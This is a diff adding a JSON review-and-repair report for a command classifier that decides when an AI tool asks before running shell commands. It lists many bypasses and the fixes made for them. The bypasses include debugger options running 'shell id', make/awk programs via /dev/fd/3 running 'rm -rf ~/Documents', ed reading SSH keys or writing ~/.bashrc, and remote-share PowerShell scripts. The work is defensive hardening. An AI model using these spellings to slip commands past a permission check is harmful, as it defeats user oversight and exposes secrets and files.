@@ -1,0 +1,165 @@
+{
+ "earlierVerifierProblems": [
+  {
+   "id": 165,
+   "severity": "must-fix",
+   "what": "Other spellings of the gdb and lldb options still run debugger commands with no ask, on the branch and on the base. The rule at classify.ts:5198 only matches -ex|-iex|-x|-o|-O|-s|-S|--eval-command|--command|--source. These all give `run`: `gdb -batch --ex 'shell id' a.out`, `gdb -batch --ex='shell id' a.out`, `gdb -batch -eval-command='shell id' a.out`, `gdb -batch -eval 'shell id' a.out`, `gdb -batch --eval 'shell id' a.out`, `gdb -batch -init-eval-command='shell id' a.out`, `gdb -batch -ix x.gdb a.out`, `gdb -batch --init-command=x.gdb a.out`, `gdb -batch -command=x.gdb a.out`, `gdb -batch --x=x.gdb a.out`, `lldb --batch --one-line 'platform shell rm -rf build' a.out`, `lldb --batch --one-line-before-file '...' a.out`, `lldb --batch --one-line-on-crash=...`, `lldb --batch --source-before-file x.lldb a.out`, `lldb --batch --source-on-crash x.lldb a.out` and `lldb --batch -k '...' a.out`. I checked the real tools (gdb, lldb) in the scratchpad: each gdb spelling ran `shell echo`, and `lldb --batch --one-line` and `--one-line-before-file` both ran their command. Separately, `-s` is in the shared regex, but for gdb `-s` means --symbols, so `gdb -batch -s x.sym a.out` now asks for no reason.",
+   "fix": "At classify.ts:5198, normalise each option: strip one or two leading dashes and cut at `=`. For gdb, ask (unclear.inline-code) when the name is ex, iex, x or ix, or is a prefix of at least 2 letters of eval-command, init-eval-command, command or init-command. gdb's getopt_long_only accepts one or two dashes and unique prefixes. For lldb, ask when the name is o, O, k, s, S or K, or one of one-line, one-line-before-file, one-line-on-crash, source, source-before-file, source-on-crash (one or two dashes, value apart or after `=`). Keep -s and -S out of gdb's list. Add posix corpus ask cases for `gdb -batch --ex 'shell id' a.out`, `gdb -batch -eval 'shell id' a.out`, `gdb -batch -init-eval-command='shell id' a.out`, `gdb -batch -ix x.gdb a.out` and `lldb --batch --one-line 'platform shell id' a.out`."
+  },
+  {
+   "id": 165,
+   "severity": "must-fix",
+   "what": "Bundled short options get past the new git grep -O check. The check at classify.ts:2184 only matches a word that starts with -O. `git grep -nOrm TODO`, `git grep -iO'sh -c id' TODO` and `git grep -lO\"rm -f\" TODO` all give `run`. Real git 2.43 run under a pty in a scratch repo: `git grep -nO'touch ran-bundle' TODO` created ran-bundle, so the pager command ran.",
+   "fix": "In the git-grep branch, also match -O inside a bundle: a word like /^-([A-Za-z]*)O(.*)$/ where the letters before O are all git grep flags that take no value (not e, f, m, A, B or C). Use the text after O as the pager command for h.e.nested, or null (unclear.rg-pre) when it is empty. Add posix corpus ask cases for `git grep -nOrm TODO` and `git grep -iO'sh -c id' TODO`."
+  },
+  {
+   "id": 165,
+   "severity": "must-fix",
+   "what": "Regression: these asked on 1b39bb3 (path.secret) and run now: `ugrep --pager '' ~/.ssh/id_rsa`, `ugrep --pager . ~/.ssh/id_rsa`, `ugrep --pager x ~/.aws/credentials`, `git grep --no-index --open-files-in-pager . ~/.ssh/id_rsa` and `git grep --open-files-in-pager TODO ~/.ssh/id_rsa`. The grep handler (classify.ts:2178) now lists pager and open-files-in-pager in longValue, so the next word is taken as the pager command. patternGiven stays false, so the real file operand is treated as the pattern and is never read. In git and ugrep the pager value is optional and must be attached with `=`. With real git 2.43, `GIT_PAGER=cat git grep --no-index --open-files-in-pager . fake_key.txt` used `.` as the pattern and printed every line of the file.",
+   "fix": "For key git-grep and ugrep, treat `--pager` and `--open-files-in-pager` written without `=` as flags (the default pager), and send only the `--pager=CMD` and `--open-files-in-pager=CMD` values to h.e.nested. ag, and ack, take a separate value, so they can keep the current parse. Add posix corpus ask cases (path.secret) for `ugrep --pager '' ~/.ssh/id_rsa` and `git grep --no-index --open-files-in-pager . ~/.ssh/id_rsa`, and a run case for `ugrep --pager foo x.txt`."
+  },
+  {
+   "id": 166,
+   "severity": "must-fix",
+   "what": "psql and sqlite3 can still read their commands from stdin through an option, with no ask: `psql -f - <<< '\\! id'`, `psql -f /dev/stdin <<< '\\! id'` and `sqlite3 -init /dev/stdin x.db .tables <<< '.shell id'` all give `run`. The psql branch skips fromStdin whenever -f is given, although psql documents `-f -` as reading stdin. sqlite3's -init FILE is not looked at.",
+   "fix": "In the psql branch (classify.ts:2248), when any -f/--file value is `-` or matches STDIN_NAME, call fromStdin(h, t => databaseText(h, [t])). In the sqlite3/sqlite/duckdb branch (classify.ts:2259), handle `-init FILE`: if the file matches STDIN_NAME, call fromStdin. For any other file, judge it with usePath(...,\"read\") and ask with unclear.sql, as `.read` already does. Add posix corpus ask cases for `psql -f - <<< '\\! id'` and `sqlite3 -init /dev/stdin x.db .tables <<< '.shell id'`."
+  },
+  {
+   "id": 166,
+   "severity": "must-fix",
+   "what": "A program fed on another file descriptor still runs with no ask: `make -f /dev/fd/3 3<<< $'all:\\n\\trm -rf ~/Documents'`, `awk -f /dev/fd/3 3<<< 'BEGIN{system(\"id\")}'` and `cmake -P /dev/fd/3 3<<< 'execute_process(COMMAND id)'` all give `run`. STDIN_NAME only matches fd 0. `bash /dev/fd/3 3<<< id` already asks with unclear.script-stream.",
+   "fix": "Add a STREAM_NAME regex, /^\\/dev\\/fd\\/\\d+$|^\\/proc\\/(self|\\d+)\\/fd\\/\\d+$/. In make/gmake/ninja -f (classify.ts:4295), awk -f (2807), cmake -P (4366), psql -f and sqlite3 -init: fd 0 or `-` goes to fromStdin as now, and any other stream asks with unclear.script-stream ('Runs code Ember can't see.'). Add posix corpus ask cases for the make and awk forms above."
+  },
+  {
+   "id": 171,
+   "severity": "must-fix",
+   "what": "On WSL, a PowerShell script on another computer's share runs with no ask: `powershell.exe -File '\\\\example\\share\\x.ps1'`, `powershell.exe -ExecutionPolicy Bypass -File '\\\\example\\share\\x.ps1'`, `pwsh.exe -File '\\\\example\\share\\x.ps1'`, `powershell.exe -File //example/share/x.ps1` and the full /mnt/c/.../powershell.exe path all give `run`. On win32, `powershell -File \\\\example\\x.ps1` asks (escape.run-remote), and on WSL `powershell.exe '\\\\example\\share\\x.ps1'` asks too. The -File branch (classify.ts:5689) calls runScript with the posix scope, so usePath's UNC check (win32 flavour only) never sees the path. inspect.ts readScriptText returns null for a script it can't read, so nothing later catches it. The finding names WSL through powershell.exe interop.",
+   "fix": "In reg(NATIVE, [\"powershell\", \"pwsh\", ...]), before runScript(h, file, \"powershell\"), judge the file in the Windows scope when the program is reached through interop: `const ws = h.pn.interop ? windowsScope(h, \"powershell\") : null; if (ws && file.v !== null) h.e.usePath(file, \"exec\", ws);`. That gives escape.run-remote for \\\\host\\... and //host/..., and leaves \\\\wsl.localhost and \\\\wsl$ alone. Add wsl.json ask cases for `powershell.exe -File '\\\\example\\share\\x.ps1'` and `pwsh.exe -File //example/share/x.ps1`."
+  },
+  {
+   "id": 166,
+   "severity": "should-fix",
+   "what": "Ordinary commands that ran on the base now ask with unclear.stdin-code: `sqlite3 x.db < schema.sql`, `psql -d x < dump.sql` and `mysql x < dump.sql`. This is inconsistent with nearby cases: `psql -d x -f dump.sql` still runs, and `python3 < x.py` runs (the script is read first, L8). #166 names here-documents, here-strings, `-f -` and process substitution, not a file redirect, and no fixture guards this change.",
+   "fix": "In the mysql (classify.ts ~2207), psql and sqlite3 branches, call fromStdin only when h.s.stdin is \"heredoc\" or \"pipe\". For stdin === \"file\", keep the base behaviour, as for `psql -f FILE`. Add posix corpus run cases for the three dump and schema commands."
+  },
+  {
+   "id": 170,
+   "severity": "should-fix",
+   "what": "Docker's usual current-folder mount now asks with unclear.unresolved-arg: `docker run --rm -v \"$(pwd)\":/src alpine id`, `-v \"$(pwd):/src\"`, `` -v `pwd`:/src `` (Linux and WSL) and PowerShell `-v \"$(Get-Location):/src\"`. All ran on the base. The `$PWD` and `${PWD}` forms still run. This idiom is in Docker's own docs.",
+   "fix": "Resolve a command substitution whose whole text is `pwd` (no arguments) to sc.cwd in posixWord, as `$PWD` already is, and resolve PowerShell `$(Get-Location)` and `$(pwd)` the same way. Or, in containerMounts (classify.ts:3849), treat a source written exactly as `$(pwd)` or `` `pwd` `` as the task folder. Add posix and powershell corpus run cases."
+  },
+  {
+   "id": 174,
+   "severity": "should-fix",
+   "what": "The new generic option pass (optionPaths, FILE_OPTION at classify.ts:1994) makes `mysql --defaults-file=~/.my.cnf -e 'select 1'`, `mysql --defaults-file ~/.my.cnf -e 'select 1'` and `mysqldump --defaults-extra-file=~/.my.cnf db` ask with path.secret. All ran on the base. An option file is how MySQL recommends keeping the password off the command line. mysql loads it and does not print it: a parse error names the file and line, not the text. Related and deliberate per commit 108c4f4: `node`, `bun`, `deno` and `uv run` with `--env-file=.env` now ask too (the lead may want to confirm that choice).",
+   "fix": "Skip option names that a program loads as its own settings without showing them: add a set such as {\"defaults-file\", \"defaults-extra-file\"} and check it before FILE_OPTION in optionPaths. Optionally add \"env-file\" there if the lead prefers the base behaviour for runtimes. Add a posix corpus run case for `mysql --defaults-file=~/.my.cnf -e 'select 1'`."
+  },
+  {
+   "id": 166,
+   "severity": "should-fix",
+   "what": "In an ed/ex script that Ember can see, the commands that read or write files are not judged; only `!` is. These give `run` (they also ran on the base): `ed <<< $'r /home/ana/.ssh/id_rsa\\n,p'` and `ed -s <<< $'e /home/ana/.ssh/id_rsa\\n,p'`, which print a key, and `ed x.txt <<< 'w /home/ana/.bashrc'` and `ex -s x.txt <<< 'w ~/.bashrc'`, which write a start-up file. Spec step B says to ask unless the visible program text is ordinary.",
+   "fix": "In the ed/ex judge (classify.ts:1885), go through each line. For e, E or r with a filename, call h.e.usePath(lit(name), \"read\", h.sc). For w, W, wq or x (and ex's sav), call usePath(..., \"write\"). A filename starting with `!` stays the shell case. Add posix corpus ask cases for the r and w forms."
+  },
+  {
+   "id": 178,
+   "severity": "should-fix",
+   "what": "`caddy reverse-proxy --from localhost:8443 --to localhost:8000` gives `run`, because --from is treated as a loopback bind. From my memory of Caddy's source (modules/caddyhttp/reverseproxy/command.go, not run here), the command listens on \":\" + the --from port on every address and uses the host only as a Host-header match. So other computers can reach the proxied service.",
+   "fix": "At classify.ts:4775, for verb reverse-proxy call listens(h, \"\", null) whatever --from says. Keep the loopback handling for file-server --listen and respond --listen, which bind to the address given. Check this against Caddy's command.go before committing, and add a posix corpus ask case."
+  },
+  {
+   "id": 171,
+   "severity": "should-fix",
+   "what": "Two more UNC reads still run on win32: `net view \\\\example` (PowerShell and cmd) and `Resolve-Path \\\\example\\x`. Both connect to that computer over SMB and sign in there, just as `dir \\\\example\\share` does, and that command now asks.",
+   "fix": "In the net handler (classify.ts:5016), also run h.e.usePath(a, \"list\", h.sc) on a \\\\host operand for verb `view`. Give Resolve-Path's cmdlet row a usePath(..., \"list\") on its -Path and -LiteralPath values. Add powershell and cmd corpus ask cases."
+  }
+ ],
+ "repairRound": {
+  "findings": [
+   {
+    "id": 165,
+    "status": "fixed",
+    "how": "Added debuggerCode() next to the gdb/lldb row and used it in place of the old regex. gdb: the option name is taken after one or two dashes and cut at `=`. It asks for ex, iex, x and ix, and for any prefix of 2 or more letters of eval-command, init-eval-command, command and init-command. gdb's -s (--symbols) no longer asks. lldb: asks for o, O, k, K, s and S, and for one-line, one-line-before-file, one-line-on-crash, source, source-before-file and source-on-crash, with one or two dashes. I checked the real tools here: `gdb -batch -ev 'shell echo'` ran the command, and so did `lldb -batch -one-line`; gdb refuses -in and -co as ambiguous.",
+    "test": "20 posix cases. Ask (unclear.inline-code): gdb --ex, --ex=, -eval-command=, -eval, --eval, -init-eval-command=, -ix, --init-command=, -command=, --x=; lldb --one-line, --one-line-before-file, --one-line-on-crash=, --source-before-file, --source-on-crash, -k, -batch -one-line. Run: gdb -batch -s x.sym a.out, gdb -batch -e a.out -c core, gdb -batch --symbols=x.sym a.out. All 17 ask cases gave run before the change. Commit e8a6ccf."
+   },
+   {
+    "id": 165,
+    "status": "fixed",
+    "how": "In the git-grep branch, the -O match is now /^-([A-Za-z0-9]*?)O(.*)$/. Every letter before O must be a flag that takes no value (not e, f, m, A, B or C). The text after O is the pager command and goes to h.e.nested; when it is empty, the case asks with unclear.rg-pre. One deviation from the suggested test: `git grep -iO'sh -c id' TODO` gives run, because the nested `sh -c id` is just `id`. That matches what `git grep -O'sh -c id'` already gave, so I used -iO'sh -c \"rm -rf build\"' as the ask case and kept -iO'sh -c id' as a run case.",
+    "test": "6 posix cases. Ask: git grep -nOrm TODO (posix.rm), -iO'sh -c \"rm -rf build\"' (posix.rm), -lO\"rm -f\" (posix.rm), -nO TODO (unclear.rg-pre). Run: -iO'sh -c id', -nw TODO. All four ask cases gave run before the change. Commit 20c4831."
+   },
+   {
+    "id": 165,
+    "status": "fixed",
+    "how": "Fixed in the same commit. For git-grep and ugrep, `pager` and `open-files-in-pager` are no longer value options in the parse. Written alone they are flags, so the next word is the pattern or a file again, and only `=CMD` values reach h.e.nested. A bare `git grep --open-files-in-pager` asks with unclear.rg-pre, the same as a bare -O. ag and ack still take the next word as the pager. optIs is now imported from words.ts.",
+    "test": "10 posix cases. Ask (path.secret): ugrep --pager '' ~/.ssh/id_rsa, ugrep --pager . ~/.ssh/id_rsa, ugrep --pager x ~/.aws/credentials, git grep --no-index --open-files-in-pager . ~/.ssh/id_rsa, git grep --open-files-in-pager TODO ~/.ssh/id_rsa. Ask: git grep --open-files-in-pager TODO (rg-pre), ugrep --pager='rm -f', git grep --open-files-in-pager='rm -f', ag --pager 'rm -f' (posix.rm). Run: ugrep --pager foo x.txt. The five secret cases asked on 1b39bb3 and gave run before the change. Commit 20c4831."
+   },
+   {
+    "id": 166,
+    "status": "fixed",
+    "how": "psql: when any -f/--file value is stdin (`-` or a STDIN_NAME), it now calls sqlFromStdin. sqlite3, sqlite and duckdb now handle -init/--init FILE: stdin goes to sqlFromStdin; any other file is judged with usePath(read) and asks with unclear.sql, as `.read` does. The values of -init and -cmd are no longer taken for the database or its SQL. One behaviour change: `sqlite3 -init x.sql x.db .tables` ran on the base and now asks (unclear.sql). This follows the suggested fix.",
+    "test": "10 posix cases. Ask (unclear.sql): psql -f - <<< '\\! id', psql -f /dev/stdin <<< …, psql --file=- <<< …, sqlite3 -init /dev/stdin x.db .tables <<< '.shell id', sqlite3 -init x.sql x.db .tables, sqlite3 -init ~/.ssh/id_rsa (also path.secret). Ask (stdin-code): cat x.sql | psql -f -. Run: psql -f - <<< 'select 1', sqlite3 -init /dev/stdin … <<< '.mode box', sqlite3 -cmd '.mode box' x.db 'select 1'. Commit 05f57cd."
+   },
+   {
+    "id": 166,
+    "status": "fixed",
+    "how": "Added STREAM_NAME, /^(\\/dev\\/fd\\/\\d+|\\/proc\\/(self|\\d+)\\/fd\\/\\d+)$/, and checked it after STDIN_NAME in make/gmake/ninja -f, awk -f, cmake -P, psql -f and sqlite3 -init. Such a stream asks with unclear.script-stream. The wording is the existing script-stream text, now kept in SAYS.scriptStream so every use of the rule says the same thing (the two old uses in recordScript use it too).",
+    "test": "6 posix cases, all ask with unclear.script-stream: make -f /dev/fd/3 3<<< $'all:\\n\\trm -rf ~/Documents', awk -f /dev/fd/3 x.txt 3<<< 'BEGIN{system(\"id\")}', cmake -P /dev/fd/3 3<<< …, ninja -f /proc/self/fd/3 3< build.x, psql -f /dev/fd/3 3<<< …, sqlite3 -init /dev/fd/3 … 3<<< …. All gave run before the change. Commit 05f57cd."
+   },
+   {
+    "id": 171,
+    "status": "fixed",
+    "how": "In the powershell/pwsh native row, when the program is reached through WSL interop (h.pn.interop), the -File path is now also judged with usePath(file, \"exec\", child(h.sc, windowsScope(h, \"powershell\"))), before runScript. This gives escape.run-remote for \\\\host\\share\\… and //host/share/…. \\\\wsl.localhost and relative names still run.",
+    "test": "7 wsl cases. Ask (escape.run-remote): powershell.exe -File '\\\\example\\share\\x.ps1', the same with -ExecutionPolicy Bypass, pwsh.exe -File '\\\\example\\share\\x.ps1', pwsh.exe -File //example/share/x.ps1, /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -File '\\\\example\\share\\x.ps1'. Run: powershell.exe -File '\\\\wsl.localhost\\Ubuntu\\home\\ana\\proj\\x.ps1', powershell.exe -File x.ps1. All five ask cases gave run before the change. Commit 88fd685."
+   },
+   {
+    "id": 166,
+    "status": "fixed",
+    "how": "Added a helper, sqlFromStdin, which calls fromStdin only when stdin is a here-document or a pipe. The mysql, psql and sqlite3 branches use it, so a file redirect (`psql < dump.sql`) runs as `psql -f dump.sql` does, as on 1b39bb3. Piped SQL still asks.",
+    "test": "5 posix cases. Run: sqlite3 x.db < schema.sql, psql -d x < dump.sql, mysql x < dump.sql, psql -f - < dump.sql. Ask (stdin-code): cat dump.sql | mysql x. The first three ran on the base and asked before the change. Commit 05f57cd."
+   },
+   {
+    "id": 170,
+    "status": "fixed",
+    "how": "posixWord now gives the scope's folder (as `$PWD` does) for a word whose only command substitution is a plain `pwd`: no arguments, redirections or assignments, exactly one sub and one command-substitution segment, so brace-expanded copies can't be mismatched. psArgValues does the same for a PowerShell value whose only subexpression is a plain Get-Location, pwd or gl. One round-2 fixture asserted that `docker run --rm -v $(pwd):/app alpine rm -rf /app/src` asks as unresolved. Its source is now $(git rev-parse --show-toplevel), which still can't be resolved, so it keeps testing what it was written for.",
+    "test": "13 cases. posix: run for -v \"$(pwd)\":/src, \"$(pwd):/src\", `pwd`:/src, \"$(pwd)/build:/out\"; ask for \"$(pwd)/..\" (docker.mount, plus path.secret-tree), \"$(pwd -P)\" and \"$(id -un)\" (unresolved-arg). wsl: run for \"$(pwd)\" and `pwd`. powershell: run for \"$(Get-Location):/src\", \"$(pwd):/src\" and \"${PWD}:/src\"; ask for \"$(Get-Location -Stack):/src\". Commit 8b49172."
+   },
+   {
+    "id": 174,
+    "status": "fixed",
+    "how": "Added SETTINGS_FILE_OPTION = {defaults-file, defaults-extra-file}. optionPaths skips these options unless the program is my_print_defaults or --print-defaults is given, because those print what the file holds. --env-file still asks for node, bun, deno and uv run, as 108c4f4 chose; the lead may want to confirm that.",
+    "test": "6 posix cases. Run: mysql --defaults-file=~/.my.cnf -e 'select 1', mysql --defaults-file ~/.my.cnf -e 'select 1', mysqldump --defaults-extra-file=~/.my.cnf db (these three ran on 1b39bb3 and asked before the change). Ask (path.secret): mysql --defaults-file=~/.my.cnf --print-defaults, my_print_defaults --defaults-file=~/.aws/credentials default, node --env-file=.env x.js. Commit 28391db."
+   },
+   {
+    "id": 166,
+    "status": "fixed",
+    "how": "Added edFiles(text, fileGiven), used in the ed/ex judge for text Ember can see. It reads each line after its address. e, E and r (ex: edit, read) read the file named. w, W, wq and x (ex: write, saveas, update) write it. A bare w writes the remembered name, which e, f, or a first r or w set when the command line named no file. Lines added with a, i or c up to a `.` line are skipped as text. A name starting with `!` stays the shell case. The case is now braced, because it declares a const.",
+    "test": "11 posix cases. Ask: ed <<< $'r /home/ana/.ssh/id_rsa\\n,p' and ed -s <<< $'e …id_rsa\\n,p' (path.secret); ed x.txt <<< 'w /home/ana/.bashrc', ex -s x.txt <<< 'w ~/.bashrc', ed -s <<< $'f ~/.bashrc…\\nw' and ex -s <<< $'e ~/.bashrc…\\nwq' (path.startup). Run: 1d+w, ,s/a/b/g+w, r notes.txt+w, a line appended with a that only looks like a w command, %s+wq. All six ask cases gave run before the change and on the base. Commit 0077970."
+   },
+   {
+    "id": 178,
+    "status": "fixed",
+    "how": "Checked against Caddy's source, fetched from the master branch's raw file: modules/caddyhttp/reverseproxy/command.go sets Listen: \":\" + fromAddr.Port and uses fromAddr.Host only as a MatchHost. fileserver/command.go and staticresp.go bind to the --listen value they are given. So reverse-proxy now always calls listens(h, \"\", null), and file-server and respond keep their loopback handling. The round-2 run case `caddy reverse-proxy --from localhost:8080 --to localhost:3000` now asks (net.listen). One line in docs/COMMANDS-WSL-SSH.md now says reverse-proxy listens on every address.",
+    "test": "3 posix cases. Ask (net.listen): caddy reverse-proxy --from localhost:8443 --to localhost:8000, caddy reverse-proxy -f 127.0.0.1:8443 -t localhost:8000. Run: caddy respond --listen 127.0.0.1:9000 hello. The round-2 case was updated as above. Commit 6339e1a."
+   },
+   {
+    "id": 171,
+    "status": "fixed",
+    "how": "The net row now judges a \\\\host operand of `view` with usePath(list), as it already did for `use`. Added a CMDLETS row for resolve-path and convert-path. It binds -Path (positional) and -LiteralPath (aliases pspath, lp) and judges a \\\\ or // value with usePath(list). It still calls textProgram, so its checks for secret variables are kept; non-UNC paths give the same results as on the base.",
+    "test": "11 cases. powershell: ask (net.unc) for net view \\\\example, Resolve-Path \\\\example\\x, -Path \\\\example\\share\\x, -LiteralPath \\\\example\\share\\x, rvpa //example/share/x and Convert-Path \\\\example\\share\\x; run for Resolve-Path src, Resolve-Path -Path .\\src -Relative and net view. cmd: ask for net view \\\\example (net.unc), run for net view. All ask cases gave run before the change. Commit 2aa2537."
+   }
+  ],
+  "commits": [
+   "e8a6ccf Judge every spelling of gdb's and lldb's command options (review #165)",
+   "20c4831 Find git grep's -O in a bundle and read a bare pager option as a flag (review #165)",
+   "05f57cd Judge SQL and build programs read through -f -, -init and other descriptors (review #166)",
+   "0077970 Judge the files an ed or ex script reads and writes (review #166)",
+   "8b49172 Read $(pwd) and $(Get-Location) as the folder, as $PWD is (review #170)",
+   "28391db Let MySQL load its option file without asking, as on the base (review #174)",
+   "6339e1a Ask before caddy reverse-proxy, which listens on every address (review #178)",
+   "88fd685 Ask before WSL runs a PowerShell script from another computer's share (review #171)",
+   "2aa2537 Ask before net view or Resolve-Path reaches another computer's share (review #171)"
+  ],
+  "checks": "All checks were run on 2aa2537 in /home/user/wt/fx-classify, on branch fix/classify.\n- `npx vitest run test/unit/commands-*.test.ts`: 17 files, 605 tests passed. Corpus sizes: posix 2063 to 2147, wsl 324 to 333, powershell 855 to 868, cmd 417 to 419.\n- `npx tsc --noEmit`: exit 0.\n- `npm run lint`: exit 0.\n- `npm test` (full): exit 0. 241 files passed and 1 skipped; 5973 tests passed and 8 skipped.\n- `npm run build`: exit 0.\n- `EMBER_INTEGRATION=1 EMBER_COMMANDS_TEST=1 npx vitest run test/integration/commands-flow-local.test.ts test/integration/commands-local.test.ts`: 2 files passed; 33 tests passed and 13 skipped.\n\nEvery case was first checked with the probe (scratchpad/classify-probe/probe.cjs). Each ask case gave run before its change. For a base comparison, probe-base.cjs was rebuilt from a git archive of 1b39bb3; the temporary copy was deleted afterwards.",
+  "notes": "Deviations and decisions for the lead:\n1. `git grep -iO'sh -c id' TODO` gives run, because the nested `sh -c id` is just `id`. This matches what `-O'sh -c id'` already gave, so the ask case uses -iO'sh -c \"rm -rf build\"'. In the same way, `git grep -nO'touch ran-bundle'` runs, because touch in the project folder is ordinary.\n2. A bare `git grep --open-files-in-pager` (default pager) asks with unclear.rg-pre, the same as a bare -O (round-2 behaviour). A bare `ugrep --pager` is a flag and runs, as on the base.\n3. `sqlite3 -init x.sql …` now asks (unclear.sql), following the suggested fix. It ran on the base.\n4. Two round-2 fixtures were changed:\n   - `docker run --rm -v $(pwd):/app alpine rm -rf /app/src` now uses $(git rev-parse --show-toplevel) as its source, so it still asks as unresolved.\n   - `caddy reverse-proxy --from localhost:8080 --to localhost:3000` changed from run to ask, per Caddy's source.\n5. `--env-file` still asks for node, bun, deno and uv run (108c4f4); please confirm.\n6. make, awk, gdb and ed reading their program from a file redirect (`make -f - < x.mk`) still ask, as since round 2. Only the three database clients got the base behaviour back, which is what the finding asked for.\n7. Seen but not fixed: vim's ex can run code without `!` (for example `call system(\"id\")`, or `\\=system()` in :s). The ed/ex judge only looks for `!` and file names. I'd propose an allowlist of ordinary ex commands.\n\nOne line changed in docs/COMMANDS-WSL-SSH.md (caddy reverse-proxy). SAYS in classify.ts gained the key `scriptStream`, a new key only. No files outside app/main/commands/classify.ts, test/fixtures/commands/*.json and that doc line were touched. Scratch case files are in /tmp/claude-0/-home-user-Ember-Powered-by-Github-Copilot/9df81ff3-d6fa-5078-ac02-9c8dbaa6cb03/scratchpad/classify-probe/f/."
+ }
+}
